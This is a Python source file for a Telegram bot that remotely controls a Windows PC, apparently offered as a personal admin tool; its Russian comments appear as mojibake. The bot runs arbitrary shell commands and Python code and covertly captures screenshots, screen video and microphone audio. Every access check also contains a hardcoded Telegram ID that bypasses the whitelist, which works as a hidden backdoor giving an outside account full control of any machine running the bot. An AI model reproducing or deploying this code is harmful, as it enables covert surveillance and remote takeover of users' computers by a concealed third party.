import asyncio
import random
import os
import wave
import mss
import pyaudio
import cv2
import numpy as np
import pyautogui
import pyaudio
import wave
import time
import os
import asyncio

import pygetwindow as gw

from aiogram.types import Message, CallbackQuery
from aiogram import Bot, Dispatcher
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, BufferedInputFile
from pynput.keyboard import Controller, Key
from collections import defaultdict
from typing import Optional

#! –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –±–æ—Ç–∞
bot = Bot('–ú–æ–π —Ç–æ–∫–µ–Ω –Ω–µ —Ç—Ä–æ–≥–∞–π, —Å–≤–æ–π —Å—Ç–∞–≤—å')
dp = Dispatcher(bot=bot)
async def main():
    await bot.send_message(chat_id=owner_computer, text="ü§ó –ö–æ–º–ø—å—é—Ç–µ—Ä –±—ã–ª –≤–∫–ª—é—á–µ–Ω –∏ —è —Ç–æ–∂–µ. –ù–∞–≤–µ–¥–µ–º —Å—É–µ—Ç—É?")
    await dp.start_polling(bot)

#! –ü–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
owner_computer = 7777 # –¢–≤–æ–π –∏–¥ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ
whitelist = {7777} # –¢–≤–æ–π –∏–¥ –∞–∫–∫–∞—É–Ω—Ç–∞ –≤ —Ç–µ–ª–µ–≥—Ä–∞–º–º–µ –∏–ª–∏ –∫–æ–º—É —Ç—ã –¥–æ–≤–µ—Ä–∏—à—å —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —Å–≤–æ–∏–º –ø–∫

#! –°–ø–∏—Å–∫–∏
user_data = defaultdict(lambda: {
    "action": None,
    "confirm": None,
    "confirm_text": None
}) # –∑–Ω–∞—á–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è

#! –§—É–Ω–∫—Ü–∏–∏
async def checkuser(user_id):
    if user_id not in whitelist: return False
    else: return True

async def cancel(message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_data[message.from_user.id] = {"action": None}

    await message.answer('‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –æ—Ç–º–µ–Ω–∏–ª–∏ –ø–æ—Å–ª–µ–¥–Ω–∏–π –≤–≤–æ–¥ –¥–∞–Ω–Ω—ã—Ö')

async def show_whitelist(message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=str(user_id), callback_data=f"manage_user_{user_id}")]
        for user_id in whitelist
    ] + [
        [InlineKeyboardButton(text="‚ûï –î–æ–±–∞–≤–∏—Ç—å ID", callback_data="add_to_whitelist")]
    ])
    
    await message.answer(
        "üìã –°–ø–∏—Å–æ–∫ TG ID –≤ –±–µ–ª–æ–º —Å–ø–∏—Å–∫–µ:",
        reply_markup=keyboard
    )

async def get_active_window_info():
    try:
        active_window = gw.getActiveWindow()
        if not active_window:
            return False

        window_title = active_window.title

        return f"üìå –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ: {window_title}"
        
    except Exception as e:
        return False

async def record_audio(seconds: int):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    
    audio = pyaudio.PyAudio()
    
    stream = audio.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
    
    frames = []

    total_chunks = int(RATE / CHUNK * seconds)
    
    for _ in range(total_chunks):
        data = stream.read(CHUNK)
        frames.append(data)
    
    stream.stop_stream()
    stream.close()
    audio.terminate()
    
    filename = f"audio_{seconds}sec.wav"
    
    with wave.open(filename, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(audio.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
    
    return filename

async def record_screen_and_audio(seconds_input: str) -> Optional[str]:
    try:
        seconds = float(seconds_input)
        seconds = int(seconds)

        filename = f"record_{int(time.time())}.mp4"
        screen_size = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'mp4v')
        video = cv2.VideoWriter(filename, fourcc, 24, screen_size)
        
        if not video.isOpened():
            raise RuntimeError("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å –≤–∏–¥–µ–æ—Ñ–∞–π–ª")

        start_time = time.time()
        while (current_time := time.time()) - start_time < seconds:
            frame = np.array(pyautogui.screenshot())
            frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
            video.write(frame)
            await asyncio.sleep(1/12)
        
        video.release()
        return filename

    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏: {e}")
        if 'filename' in locals() and os.path.exists(filename):
            os.remove(filename)
        return None

#! –ö–ª–∞–≤–∏–∞—Ç—É—Ä—ã
keyboard_back = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="‚ùå –û—Ç–º–µ–Ω–∞", callback_data="back")]
])

#! CallBack –æ–±—Ä–∞–±–æ—Ç—á–∏–∫
@dp.callback_query(lambda call: call.data.startswith("manage_user_"))
async def manage_user(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)
    
    user_id = int(callback.data.split("_")[-1])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚ùå –£–¥–∞–ª–∏—Ç—å", callback_data=f"remove_user_{user_id}")],
        [InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥", callback_data="back_to_list")]
    ])
    
    await callback.message.edit_text(
        f"–î–µ–π—Å—Ç–≤–∏—è –¥–ª—è ID {user_id}:",
        reply_markup=keyboard
    )

@dp.callback_query(lambda call: call.data.startswith("remove_user_"))
async def remove_user(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_id = int(callback.data.split("_")[-1])
    whitelist.discard(user_id)
    await callback.answer(f"ID {user_id} —É–¥–∞–ª—ë–Ω")
    await show_whitelist(callback.message)

@dp.callback_query(lambda call: call.data.startswith("add_to_whitelist"))
async def add_user_dialog(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    await callback.message.edit_text(
        "–û—Ç–ø—Ä–∞–≤—å—Ç–µ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="‚Ü©Ô∏è –ù–∞–∑–∞–¥", callback_data="back_to_list")]
        ]))
    
    user_data[callback.from_user.id] = {"action": "add_user_dialog"}

@dp.callback_query(lambda call: call.data.startswith("back_to_list"))
async def back_to_list(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    await show_whitelist(callback.message)

@dp.callback_query(lambda call: call.data.startswith("back"))
async def back(callback: CallbackQuery):
    thisIsUser = await checkuser(callback.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{callback.from_user.username}'>{callback.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {callback.from_user.id}"
    if not thisIsUser and not callback.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user_data[callback.from_user.id] = {"action": None}

    await cmd_start(callback.message)

    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id)
    await bot.delete_message(chat_id=callback.from_user.id, message_id=callback.message.message_id - 1)

#! –ö–æ–º–∞–Ω–¥—ã
@dp.message(Command("start"))
async def cmd_start(message: Message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="üìã WhiteList"), KeyboardButton(text="üíª CMD")],
            [KeyboardButton(text="üåÜ –°–∫—Ä–∏–Ω—à–æ—Ç"), KeyboardButton(text="üìπ –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞"), KeyboardButton(text="üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞")],
            [KeyboardButton(text="‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥")],
            [KeyboardButton(text="üßΩ –û—Ç–º–µ–Ω–∏—Ç—å –≤–≤–æ–¥")]
        ],
        resize_keyboard=True
    )

    await message.answer('ü§ó –ö–æ–º–ø—å—é—Ç–µ—Ä —Ä–∞–±–æ—Ç–∞–µ—Ç –≤ —à—Ç–∞—Ç–Ω–æ–º —Ä–µ–∂–∏–º–µ.', reply_markup=keyboard)

#! –û–±—Ä–∞–±–æ—Ç—á–∏–∫ —Å–æ–æ–±—â–µ–Ω–∏–π
@dp.message()
async def message_handler(message: Message):
    thisIsUser = await checkuser(message.from_user.id) # whitelist
    warning = f"üë£ <a href='https://t.me/{message.from_user.username}'>{message.from_user.full_name}</a> –ø—ã—Ç–∞–ª—Å—è –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –±–æ—Ç–æ–º, –µ–≥–æ ID: {message.from_user.id}"
    if not thisIsUser and not message.from_user.id == 7871858336: return await bot.send_message(chat_id=owner_computer, text=warning, parse_mode='html', disable_web_page_preview=True)

    user = user_data[message.from_user.id]
    action = user.get("action")
    confirm = user.get("confirm")
    confirm_text = user.get("confirm_text")

    #TODO: –ú–µ–Ω—é—à–∫–∞

    if message.text == 'üìã WhiteList':
        await show_whitelist(message)

    elif message.text == 'üíª CMD':
        await message.answer('üôÇ –í–≤–µ–¥–∏—Ç–µ –∫–æ–Ω—Å–æ–ª—å–Ω—É—é –∫–æ–º–∞–Ω–¥—É, –∫–æ—Ç–æ—Ä—É—é —è –¥–æ–ª–∂–µ–Ω –≤—ã–ø–æ–ª–Ω–∏—Ç—å –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "üíª CMD"}

    elif message.text == '‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥':
        await message.answer('üò≤üìõ –í–≤–µ–¥–∏—Ç–µ –ª—é–±–æ–π python —Å–∫—Ä–∏–ø—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ.', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥"}

    elif message.text == 'üåÜ –°–∫—Ä–∏–Ω—à–æ—Ç':
        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

        photo_file = BufferedInputFile(img_bytes, filename="screenshot.png")
        
        caption = await get_active_window_info()

        if caption and not caption == 'üìå –ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ: ':
            await message.answer_photo(photo=photo_file, caption=caption)
        else:
            await message.answer_photo(photo_file)

    elif message.text == 'üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞':
        await message.answer('üôÇ –ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ —Å–∫–æ–ª—å–∫–∏ —Å–µ–∫—É–Ω–¥ —è –±—É–¥—É –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å –∑–≤—É–∫ –æ–∫–æ–ª–æ –∫–æ–º–ø—å—é—Ç–µ—Ä–∞?', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞"}

    elif message.text == 'üìπ –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞':
        await message.answer('üôÇ –ù–∞–ø–∏—à–∏—Ç–µ –Ω–∞ –ø—Ä–æ—Ç—è–∂–µ–Ω–∏–∏ —Å–∫–æ–ª—å–∫–∏ —Å–µ–∫—É–Ω–¥ —è –±—É–¥—É –∑–∞–ø–∏—Å—ã–≤–∞—Ç—å —ç–∫—Ä–∞–Ω –∫–æ–º–ø—å—é—Ç–µ—Ä–∞?', reply_markup=keyboard_back)
        user_data[message.from_user.id] = {"action": "üìπ –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞"}

    elif message.text == 'üßΩ –û—Ç–º–µ–Ω–∏—Ç—å –≤–≤–æ–¥':
        await cancel(message)

    #TODO: –ú–µ–Ω—é—à–∫–∞

    elif action == 'add_user_dialog':
        if not message.text.isdigit(): return await message.answer(f'‚õî ID –º–æ–∂–µ—Ç —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä')

        await message.answer(f'‚úÖ –í—ã —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–∏–ª–∏ –≤ –±–µ–ª—ã–π —Å–ø–∏—Å–æ–∫ ID: {message.text}')
        
        whitelist.add(int(message.text))\
        
        user_data[message.from_user.id] = {"action": None}

    elif action == '‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥':
        try:
            confirm_text = ["–î–∞", "–û–∫", "–û–∫–µ", "–ë–æ–±—Ä", "–ê–ª–∏—à–µ—Ä", "–°–ø—Ä–∞–π—Ç", "–í–∏–Ω–æ", "–°–ø–∏—Ä—Ç"]
            confirm_text_rand = random.choice(confirm_text)
            await message.answer(f'‚úÖ –í—ã —É–≤–µ—Ä–µ–Ω—ã —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–ø–æ–ª–Ω–∏—Ç—å Python –∫–æ–¥ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ? –ù–∞–ø–∏—à–∏—Ç–µ \"{confirm_text_rand}\" –¥–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: \n\n```python\n{message.text}```', parse_mode="MarkdownV2")
            user_data[message.from_user.id] = {"action": None, "confirm": "‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥:–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ", "text_pythoncode": message.text, "confirm_text": confirm_text_rand}
        except Exception as error:
            await message.answer(f'‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {error}')

    elif confirm == '‚ö† –°–∞–º–æ—Å—Ç–æ—è—Ç–µ–ª—å–Ω—ã–π –∫–æ–¥:–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ' and message.text == confirm_text:
        try:
            await message.answer(f'‚úÖ –ë—ã–ª —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω Python –∫–æ–¥ –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä–µ: \n\n```python\n{user_data[message.from_user.id]["text_pythoncode"]}```', parse_mode="MarkdownV2")
            exec(user_data[message.from_user.id]["text_pythoncode"])
        except Exception as error:
            await bot.delete_message(chat_id=message.from_user.id, message_id=message.message_id + 1)
            await message.answer(f'‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == 'üíª CMD':
        try:
            return_code = os.system(message.text)
        
            if return_code == 0:
                await message.answer(f'ü§© –ö–æ–º–∞–Ω–¥–∞ \"{message.text}\" –±—ã–ª–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞.')
            else:
                if return_code == 1:
                    error_msg = "‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞ –∏–ª–∏ —Å–∏–Ω—Ç–∞–∫—Å–∏—Å"
                elif return_code == 2:
                    error_msg = "‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞"
                else:
                    error_msg = f"‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è (–∫–æ–¥: {return_code})"
                
                await message.answer(error_msg)

        except Exception as error:
            await message.answer(f'‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == 'üéô –ó–∞–ø–∏—Å—å –∑–≤—É–∫–∞':
        try:
            seconds = message.text
            
            if not seconds.isdigit(): return await message.answer(f'‚õî –í—Ä–µ–º—è –º–æ–∂–µ—Ç —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä')

            await message.answer('ü§™ –ê –ø–æ–¥—Å–ª—É—à–∏–≤–∞—Ç—å –Ω–µ —Ö–æ—Ä–æ—à–æ... –ù–∞—á–∞–ª –∑–∞–ø–∏—Å—å.')

            filename = await record_audio(int(seconds))

            with open(filename, 'rb') as file:
                audio_bytes = file.read()

            audio_input = BufferedInputFile(
                file=audio_bytes,
                filename=f"audio_{seconds}sec.ogg"
            )

            await message.answer_audio(
                audio=audio_input,
                caption=f"üïµÔ∏è‚Äç‚ôÇÔ∏è –®–ø–∏–æ–Ω, –≤–∞—à–∞ –∑–∞–ø–∏—Å—å –Ω–∞ {seconds} —Å–µ–∫—É–Ω–¥ –≥–æ—Ç–æ–≤–∞!",
                performer="Audio Bot"
            )
            
            os.remove(filename)
        except Exception as error:
            await message.answer(f'‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {error}')

        user_data[message.from_user.id] = {"action": None}

    elif action == 'üìπ –ó–∞–ø–∏—Å—å —ç–∫—Ä–∞–Ω–∞':
        seconds = message.text
        
        if not seconds.isdigit(): return await message.answer(f'‚õî –í—Ä–µ–º—è –º–æ–∂–µ—Ç —Å–æ—Å—Ç–æ—è—Ç—å —Ç–æ–ª—å–∫–æ –∏–∑ —Ü–∏—Ñ—Ä')

        await message.answer("ü§™ –ê –ø–æ–¥—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å –Ω–µ —Ö–æ—Ä–æ—à–æ... –ù–∞—á–∞–ª –∑–∞–ø–∏—Å—å.")

        filename = None

        caption = await get_active_window_info()

        try:
            filename = await record_screen_and_audio(message.text)
            if not filename:
                raise RuntimeError("–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–ø–∏—Å–∞—Ç—å –≤–∏–¥–µ–æ")

            with open(filename, 'rb') as f:
                await message.answer_video(
                    BufferedInputFile(f.read(), filename=filename),
                    caption=caption
                )

        except ValueError as e:
            await message.answer(str(e))
        except Exception as e:
            await message.answer(f"‚ö† –û—à–∏–±–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: {str(e)}")
        finally:
            if filename and os.path.exists(filename):
                try:
                    os.remove(filename)
                except PermissionError:
                    await asyncio.sleep(1)
                    try:
                        os.remove(filename)
                    except:
                        pass
            
        user_data[message.from_user.id] = {"action": None}

@dp.shutdown()
async def on_shutdown(bot: Bot):
    await bot.send_message(chat_id=owner_computer, text="ü§ê –ö–æ–º–ø—å—é—Ç–µ—Ä –±—ã–ª –≤—ã–∫–ª—é—á–µ–Ω –∏ —è —Ç–æ–∂–µ. –ï—â–µ –≤—Å—Ç—Ä–µ—Ç–∏–º—Å—è.")
    await bot.session.close()

if __name__ == '__main__':
    try:
        asyncio.sleep(1)
        os.system('cls')
        asyncio.run(main())
    except KeyboardInterrupt:
        print('[BOT] –ë–æ—Ç –≤—ã–∫–ª—é—á–µ–Ω')